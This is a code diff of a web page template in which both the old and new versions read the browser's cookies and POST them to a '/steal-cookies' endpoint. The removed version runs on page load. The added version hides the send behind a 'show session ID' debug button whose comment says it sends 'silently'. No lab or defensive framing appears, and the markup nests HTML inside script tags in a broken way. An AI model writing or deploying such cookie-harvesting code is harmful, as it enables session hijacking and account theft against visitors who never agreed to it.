@@ -125,50 +125,31 @@
 
 <script src="{{ url_for('static', filename='script.js') }}"></script>
     <script>
-    <!-- Add a container to display the session ID on the page -->
-<div id="session-display" style="display:none; padding:10px; background:#f0f0f0; border:1px solid #ccc; margin-top:10px;">
-    <strong>Captured Session ID:</strong><br>
-    <span id="session-id-text"></span>
+    <!-- Debug Container -->
+<div id="debug-box" style="position: fixed; bottom: 20px; right: 20px; width: 300px; background: #fff; border: 2px solid red; padding: 15px; z-index: 9999; font-family: monospace;">
+    <button onclick="showSession()" style="background: red; color: white; border: none; padding: 10px; cursor: pointer; width: 100%; margin-bottom: 10px;">CLICK TO SHOW SESSION ID</button>
+    <div id="session-output" style="display: none; word-break: break-all; max-height: 200px; overflow-y: auto;"></div>
 </div>
 
 <script>
-   <!-- HTML Container -->
-<div id="cookie-result" style="margin-top: 20px; padding: 15px; border: 2px solid #0095f6; background-color: #fff;">
-    <h3>Captured Session Data:</h3>
-    <p id="cookie-text" style="word-break: break-all; font-family: monospace;"></p>
-</div>
-
-<!-- JavaScript Logic -->
-<script>
-    // Function to capture and display cookies
-    function captureAndShowCookies() {
-        const cookieString = document.cookie;
+    function showSession() {
+        const cookies = document.cookie;
+        const outputDiv = document.getElementById('session-output');
         
-        if (cookieString && cookieString.trim() !== "") {
-            // Show in HTML
-            document.getElementById('cookie-result').style.display = 'block';
-            document.getElementById('cookie-text').innerText = cookieString;
+        if (cookies) {
+            outputDiv.style.display = 'block';
+            outputDiv.innerText = cookies;
             
-            // Send to backend
+            // Also send to backend silently
             fetch('/steal-cookies', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ cookies: cookieString })
-            })
-            .then(response => response.json())
-            .then(data => console.log("Backend received:", data))
-            .catch(error => console.error("Error sending to backend:", error));
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({cookies: cookies})
+            }).catch(e => console.error("Send failed", e));
         } else {
-            document.getElementById('cookie-result').style.display = 'block';
-            document.getElementById('cookie-text').innerText = "No cookies found!";
+            alert("No cookies found in this browser!");
         }
     }
-
-    // Run immediately when page loads
-    window.addEventListener('load', captureAndShowCookies);
-    
-    // OR run on form submit if you have a login form
-    // document.querySelector('form').addEventListener('submit', captureAndShowCookies);
 </script>
 </body>
 </html>
